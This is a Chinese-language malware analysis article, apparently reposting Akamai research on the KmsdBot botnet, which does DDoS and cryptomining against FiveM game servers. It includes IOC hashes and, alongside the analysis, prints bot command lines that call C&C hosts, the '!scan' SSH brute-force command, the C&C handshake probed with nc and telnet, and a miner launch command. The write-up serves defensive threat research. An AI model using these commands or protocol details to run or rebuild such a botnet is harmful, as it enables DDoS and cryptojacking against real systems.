Akamai 最近通过全球部署的蜜罐，发现了一个为游戏行业量身定制的具有 DDoS 能力与加密货币挖掘能力的僵尸网络 KmsdBot。

## 发现 KmsdBot

由于蜜罐是对外开放的，会有大量的攻击行为被发现，其中有很多下载恶意软件的命令。其中有一个引起了分析人员的注意：

![image.png-337.8kB](https://image.3001.net/images/20221128/1669566487_638390177ad2e6fec1ca7.png!small)下载日志

攻击者利用 FTP 下载所需的恶意样本，FTP 服务器上还有很多其他样本。

![image.png-192.7kB](https://image.3001.net/images/20221128/1669566488_638390186a0cc35a6b9c3.png!small)支持各种架构

从目录上看恶意软件支持各种 CPU 架构，但其实有些包含二进制文件，有些是空目录。攻击者可能在陆续扩展所支持的架构，扩大攻击目标范围。

download.php 脚本中包含恶意代码，用于在 Web 服务器上下载恶意软件。

![image.png-264.7kB](https://image.3001.net/images/20221128/1669566489_638390193ce75fa80f670.png!small)恶意代码

部分架构（如 x86_64 和 386）下有恶意样本能够下载，如下所示：

![image.png-79kB](https://image.3001.net/images/20221128/1669566490_6383901a79d2cfd9f5948.png!small)大小相似的二进制文件似乎是同一恶意软件代码的修改版

这些样本都是 Go 开发的二进制文件：

> client: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically
> linked, Go BuildID=ob_PyXeD8H4173aDP-> NM/Z7DzwyNXZ8c1Wr7LyTOK/t8bg8nky3tdpKdKSAvyp/_nWexL6rk1sZt5hRLfgs, with
> debug_info, not stripped  
> ksmdm: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically
> linked, interpreter /lib64/ld-linux-x86-64.so.2, Go
> BuildID=lmjZVXbGVxjEutEAYziK/ak2EoKWzPPmCz2ipOltK/uKypKwO7m2jjT2AT0qnG/PiKIqd334XYNEl_likc3,
> with debug_info, not stripped  
> ksmds: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically
> linked, interpreter /lib64/ld-linux-x86-64.so.2, Go
> BuildID=CV7cqV3r6hVM05Ma2jpB/kc_FWOhPv8HtKZQUhiUi/jrGTR9lhjVWxp-9kHdDA/ev1S8rMmqqwjpvWz4sLX,
> with debug_info, not stripped  
> ksmdx: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically
> linked, interpreter /lib64/ld-linux-x86-64.so.2, Go
> BuildID=S65yXt0R7hEC1YEm5Ci7/qGG-> jP6bpvA1TCgQwZoV/WpM491XNek0FReOrQmX_/EMNmhh6mJI8ycZhLPtP4, with debug_info,
> not stripped  
> kxmd: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically
> linked, interpreter /lib64/ld-linux-x86-64.so.2, Go
> BuildID=57pm413aVTQ8gOrUjHox/DwlgdSzYxLxitlBpe0OR/hdbtJaHv8ujFruku5AIJ/RrSUbVKsJ9wj-> rBopzh3, with debug_info, not stripped  
> kzmd: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically
> linked, interpreter /lib64/ld-linux-x86-64.so.2, Go
> BuildID=2FTLNIjq7bgMnSOW0NhD/YBc64Ubft703RycI5yQL/85YkVXL_eseyGJG3XHm1/M_laLRa5tNb5oeZ24ROq,
> with debug_info, not stripped

## 分析

这些二进制文件的包名称都是 /root/client，这意味着它们可能都是相同的恶意软件，只是版本不同。他们中有一个文件能够完成 C&C
通信、软件更新与加密货币挖掘，另一个文件可以进行攻击。

> $ diff client.source ksmdm.source  
> 19,23c19,23  
> < start Lines: 12 to 28 (16)  
> < startfunc1 Lines: 19 to 30 (11)  
> < startfunc2 Lines: 22 to 22 (0)  
> < udpclimb Lines: 30 to 60 (30)
>
> < tcpclimb Lines: 60 to 88 (28)
>
> start Lines: 10 to 26 (16)  
> startfunc1 Lines: 17 to 28 (11)  
> startfunc2 Lines: 20 to 20 (0)  
> udpclimb Lines: 28 to 58 (30)  
> tcpclimb Lines: 58 to 86 (28)

恶意软件的攻击目标是一家名为 FiveM 的游戏公司，支持用户为 Grand Theft Auto Online 部署自定义私服。下图为样本打开 UDP
套接字后，使用 FiveM Token 构建数据包，浪费服务器资源。

![image.png-790.1kB](https://image.3001.net/images/20221128/1669566491_6383901b4705a0c991ac6.png!small)构建数据包

### 扫描传播

ksmdx 样本中包含扫描、更新与挖矿的功能：

> Package main: /root/client  
> File: client.go  
> (*Client)Recv Lines: 23 to 34 (11)  
> (*Client)Handle Lines: 34 to 52 (18)  
> (*Client).Handlefunc1 Lines: 35 to 35 (0)  
> File: command.go  
> NewCommand Lines: 15 to 32 (17)  
> (*Command)Handle Lines: 32 to 62 (30)  
> File: commandfunctions.go  
> ShellExec Lines: 11 to 23 (12)  
> scan Lines: 23 to 50 (27)  
> stopscan Lines: 50 to 69 (19)  
> updateminer Lines: 69 to 108 (39)  
> stopmine Lines: 108 to 127 (19)  
> updateclient Lines: 127 to 159 (32)  
> File: main.go  
> main Lines: 8 to 16 (8)  
> File: methods.go  
> start Lines: 12 to 28 (16)  
> startfunc1 Lines: 19 to 30 (11)  
> startfunc2 Lines: 22 to 22 (0)  
> udpclimb Lines: 30 to 60 (30)  
> tcpclimb Lines: 60 to 88 (28)  
> File: utils.go  
> randomwallet Lines: 73 to 79 (6)  
> envname Lines: 79 to 129 (50)

ksmdx 会向 C&C 服务器发送 `Bruh Started:`的 HTTP POST 请求，以此进行失陷主机上线。

> $./ksmdx 192.168.0.14 /ksmdm 192.168.0.14 kumd kxmds

HTTP 日志中的请求为：

> 192.168.0.44 - - [20/Oct/2022:13:09:34 -0400] "GET /ksmdm HTTP/1.1" 200
> 2904330 "-" "Go-http-client/1.1"

在 45833 端口上可以看到 POST 请求：

![image.png-36.1kB](https://image.3001.net/images/20221128/1669566493_6383901d92d1905bb7eac.png!small)POST
请求

向 C&C 服务器发送 !scan 命令即可获取 SSH 服务凭据爆破列表：

![image.png-76.1kB](https://image.3001.net/images/20221128/1669566494_6383901e1465c5da30b5c.png!small)爆破列表

> !scan xxx.xxx.xxx.xxx xxx.xxx.xxx.xxx/win/kzmds xxx.xxx.xxx.xxx kvmd kmsd

### C&C 通信

蜜罐日志中能够看到恶意软件从一个新的 IP 地址对蜜罐发起攻击，上传了新的恶意样本，内置了新的 C&C IP 地址。

> [pid 18212] connect(3, {sa_family=AF_INET, sin_port=htons(51382),
> sin_addr=inet_addr("xxx.xxx.xxx.xxx")}, 16) = -1 EINPROGRESS (Operation now
> in progress)  
> [pid 1047] connect(4, {sa_family=AF_INET, sin_port=htons(51388),
> sin_addr=inet_addr("xxx.xxx.xxx.xxx")}, 16) = -1 EINPROGRESS (Operation now
> in progress)

查看流量可以发现失陷主机使用空字节初始化连接，C&C 服务器响应 0x01，随后失陷主机返回 0x02。

> [pid 2514865] write(4, "0x02", 4) = 4
>
> And 0x01 is the response
    
    
    xxx.xxx.xxx.xxx.51388 > xxx.xxx.xxx.xxx.52280: Flags [P.], cksum 0xf2b4 (correct), seq 20:24, ack 21, win 510, options [nop,nop,TS val 1019359456 ecr 4067014838], length 4
    0x0000:  4500 0038 adf3 4000 3a06 9b4a ab16 1e1f  E..8..@.:..J....
    0x0010:  c63a 6812 c8bc cc38 81f9 f90a abeb 552a  .:h....8......U*
    0x0020:  8018 01fe f2b4 0000 0101 080a 3cc2 30e0  ............<.0.
    0x0030:  f269 b8b6 3078 3031                      .i..0x01
    

使用 netcat 可以进行简单测试：

> $ echo "0x00" | nc xxx.xxx.xxx.xxx 51388  
> 0x01
>
> [pid 2516369] write(4, "0x00", 4) = 4
>
> It looks like 0x02 is the heartbeat
    
    
    xxx.xxx.xxx.xxx.52280 > xxx.xxx.xxx.xxx.51388: Flags [P.], cksum 0xf7ac (incorrect -> 0xd616), seq 57:61, ack 57, win 502, options [nop,nop,TS val 4066922833 ecr 1019262337], length 4
    0x0000:  4500 0038 3010 4000 4006 132e c63a 6812  E..80.@.@....:h.
    0x0010:  ab16 1e1f cc38 c8bc abeb 54de 81f9 f8c2  .....8....T.....
    0x0020:  8018 01f6 f7ac 0000 0101 080a f268 5151  .............hQQ
    0x0030:  3cc0 b-581 3078 3032                      <...0x02
    

通信流量如下所示：

> % telnet xxx.xxx.xxx.xxx 57388  
> Trying xxx.xxx.xxx.xxx...  
> Connected to xxx.xxx.xxx.xxx.  
> Escape character is '^]'.  
> 0x00  
> 0x010x02  
> 0x010x02  
> 0x010x02  
> 0x010x02  
> 0x010x02  
> 0x01

### 挖矿

sym.main.randomwallet() 函数中内置了数个钱包地址，在连接矿池时会随机选择。分析人员在分析时，并未发现任何挖矿行为，僵尸网络只进行了
DDoS 攻击。当然，攻击者仍然可以通过 ./ksmdr -o pool.hashvault.pro 命令来启动挖矿。

> │ │╎ 0x0065b6b0 488d05356c08. lea rax, [0x006e22ec] ;
> "42WDUXX5UYtNf9DyboNRx6TgNrJD43QfgTvEjh8djtdKVoNppnN96Nz8sVp2wWJTQgW9e8XjFLkv6KpSEgwWbLXLMKn5wwg42vGrE1WDpKgue8Y9ewpi6gXupMqDqYi"  
> │ │╎ 0x0065b6b7 4889442428 mov qword [var_28h], rax  
> │ │╎ 0x0065b6bc 48c74424305f. mov qword [var_30h], 0x5f ; '_'  
> │ │╎ ; [0x5f:8]=-1 ; 95  
> │ │╎ 0x0065b6c5 488d053d6d08. lea rax, [0x006e2409] ;
> "46DBehyheMSatgdGffv8SVAEK8ts6Ur4wToVNL99Yqo6ZGnv7q4QpaxG7YnaasngPvN1rbyxYyCZAABgyXyme92wRMaVn1V3617de4a96262c6f5d9e98bf9292dc29"  
> │ │╎ 0x0065b6cc 4889442438 mov qword [var_38h], rax  
> │ │╎ 0x0065b6d1 48c74424405f. mov qword [var_40h], 0x5f ; '_'  
> │ │╎ ; [0x5f:8]=-1 ; 95  
> │ │╎ 0x0065b6da 488d05c96c08. lea rax, [0x006e23aa] ;
> "45yK4gR5QCNag2X4g6ss6PUiL4s1e929b8mev4Rz3CbiTPU9NSXYHiyPL9FMi6cDVvD7EKho4atUf82s3vkVfFXNSsMqyUE46DBehyheMSatgdGffv8SVAEK8ts6Ur4"  
> │ │╎ 0x0065b6e1 4889442448 mov qword [var_48h], rax  
> │ │╎ 0x0065b6e6 48c74424505f. mov qword [var_50h], 0x5f ; '_'  
> │ │╎ ; [0x5f:8]=-1 ; 95  
> │ │╎ 0x0065b6ef 488d05556c08. lea rax, [0x006e234b] ;
> "42vGrE1WDpKgue8Y9ewpi6gXupMqDqYiKV4EwM7CFZFuNdRKP3dG6rADE7DRAcoEWGY6LmgCRKAiX16wGAu3Tj4mMQ9HR5B45yK4gR5QCNag2X4g6ss6PUiL4s1e929"

对样本分析后，可以确定很多文件都是同一代码库的不同版本，僵尸网络仍然在积极迭代更新。

> $ diff reports/kxmd/kxmd-src.txt
> reports/75569874dadb814ce51d121c108ead006b0f39c27057945b649837563f635f51/75569874dadb814ce51d121c108ead006b0f39c27057945b649837563f635f51-src.txt  
> 8c8
>
> < (*Command)Handle Lines: 32 to 136 (104)
>
> (*Command)Handle Lines: 32 to 144 (112)  
> 11,18c11,20  
> < scan Lines: 23 to 50 (27)  
> < stopscan Lines: 50 to 69 (19)  
> < updateminer Lines: 69 to 108 (39)  
> < stopmine Lines: 108 to 127 (19)  
> < updateclient Lines: 127 to 161 (34)  
> < loadclient Lines: 161 to 180 (19)  
> < startminer Lines: 180 to 193 (13)
>
> < reloadminer Lines: 193 to 208 (15)
>
> scan Lines: 23 to 52 (29)  
> startscan Lines: 52 to 75 (23)  
> stopscan Lines: 75 to 97 (22)  
> updateminer Lines: 97 to 144 (47)  
> stopmine Lines: 144 to 166 (22)  
> updateclient Lines: 166 to 202 (36)  
> loadclient Lines: 202 to 221 (19)  
> removefile Lines: 221 to 235 (14)  
> startminer Lines: 235 to 248 (13)  
> reloadminer Lines: 248 to 264 (16)  
> 54,60c56,62  
> < getrandpath Lines: 12 to 62 (50)  
> < get Lines: 62 to 109 (47)  
> < fivem Lines: 109 to 156 (47)  
> < fivemguid Lines: 156 to 204 (48)  
> < post1 Lines: 204 to 255 (51)  
> < post Lines: 255 to 344 (89)
>
> < bigdata Lines: 344 to 386 (42)
>
> getrandpath Lines: 11 to 61 (50)  
> get Lines: 61 to 108 (47)  
> fivem Lines: 108 to 158 (50)  
> fivemguid Lines: 158 to 206 (48)  
> post1 Lines: 206 to 257 (51)  
> post Lines: 257 to 346 (89)  
> bigdata Lines: 346 to 388 (42)

### 攻击流量分析

在四层 TCP/UDP 攻击数据包中，随机数据作为 Payload。在七层 HTTP 攻击数据包中，针对特定路径发起 GET/POST 请求。

![image.png-344.2kB](https://image.3001.net/images/20221128/1669566494_6383901eb37c1c9fb42ef.png!small)攻击请求

![image.png-116kB](https://image.3001.net/images/20221128/1669566495_6383901fe11b4bbffbceb.png!small)攻击请求

![image.png-163kB](https://image.3001.net/images/20221128/1669566496_63839020a88adb27cf03d.png!small)攻击请求

在函数 sym.main.connect() 中定义了 C&C 通信，如下所示：

![image.png-1029.1kB](https://image.3001.net/images/20221128/1669566497_6383902168042c5b50038.png!small)C&C
通信

![image.png-211.6kB](https://image.3001.net/images/20221128/1669566498_63839022c1651276cf54a.png!small)C&C
通信

![image.png-302.1kB](https://image.3001.net/images/20221128/1669566499_638390239084b5e62a89d.png!small)TCP
洪水数据包

## 结论

KmsdBot 最初针对游戏公司进行攻击，目前已经转向大型奢侈品品牌。尽管攻击方式仍然是原始的 SSH 服务爆破，但仍然应该引起注意。

## IOC

> 701b874a56a9a0ed4101a88621441afec936c4210e18d9a3e20f9a95c454ce40 client  
> 8d1df3c5357adbab988c62682c85b51582649ff8a3b5c21fca3780fe220e5b11 ksmdm  
> e83a61c538f11e4fc9dd9d0f414a9e74d0d585ffe3302e4d3741be6a3523bd1e ksmds  
> 714eeba5b6e4610946cd07c1ddadddc94052bfe450a8a9b1c23495721082884d ksmdx  
> 8775bdd7a33f136d31b2840dab68505ac0ab8eaa0bcb-58713fae36552b8a1f95 kxmds  
> b927e0fe58219305d86df8b3e44493a7c854a6ea4f76d1ebe531a7bfd4365b54 kxmd  
> 75569874dadb814ce51d121c108ead006b0f39c27057945b649837563f635f51 kzmd  
> 09761d69bd5b00b2e767a1105dd3e80ce17b795cd817676c737a1e83c5b96f1b kumd.exe  
> 8d1df3c5357adbab988c62682c85b51582649ff8a3b5c21fca3780fe220e5b11 ksmdm  
> 3928c5874249cc71b2d88e5c0c00989ac394238747bb7638897fc210531b4aab
> ksmdr(xmrig)  
> e83a61c538f11e4fc9dd9d0f414a9e74d0d585ffe3302e4d3741be6a3523bd1e ksmds  
> 01b4d10e08d10c36d0c50f00d017fd6b3da8ebdd194ecafd12b0335c07f9ae10 ksmdx  
> 74075b2bdfaf52d9e5984a28ec7765ae489077a69dd696718e724a455a6f7910 kumd  
> b927e0fe58219305d86df8b3e44493a7c854a6ea4f76d1ebe531a7bfd4365b54 kxmd  
> 8775bdd7a33f136d31b2840dab68505ac0ab8eaa0bcb-58713fae36552b8a1f95 kxmds  
> 7fe04a3307666e6b6dac381664c901daea3ed5e8af3d7700ac5bde9550350d5a kmsd.amd64  
> 2e091ecc4c912e6fbe4258da470459018dc8f3efde2803281a416a2c8eb8cf1a kmsd.arm  
> 7c8a06b85280a43f96215203fb229d0f2a91b23d84e6ab2d25d9382fef19c35b kmsd.arm64  
> da609100cb66e6e4e79916ca1e7481269406e6a484f46187b3accb1626552d61 kmsd.mips  
> 8136613eb3427f908a200f52b7938cc184a31b626b6c85a35e664c064de6d533 kmsd.mips64  
> 50f2fb45c11e40ea4bbf4a8a733b6e65ce25c3f182aa0aa33ffb59ebae712003 kmsd.mipsle  
> e5a06b250ba10fe0156efe7399b321cb8b1fc8b1929e49ee62d837fa1440313f kmsd.ppc64  
> 2971a37849388c7c3af0840eabc52f0b604fb9894429b7397100b12a069cfeff
> kmsd.ppc64le  
> 247b0d5e40b8b1ec316e9700b499a2dc20d73bfd7f36d913e7725334a2818a7e
> kmsd.riscv64  
> 7517e597a6ba4a8659b2dd4252085a99baca000684435f8b451af1418bfcac84 kmsd.s390x

## 参考来源

> [Akamai](https://www.akamai.com/blog/security-research/kmdsbot-the-attack-> and-mine-malware)

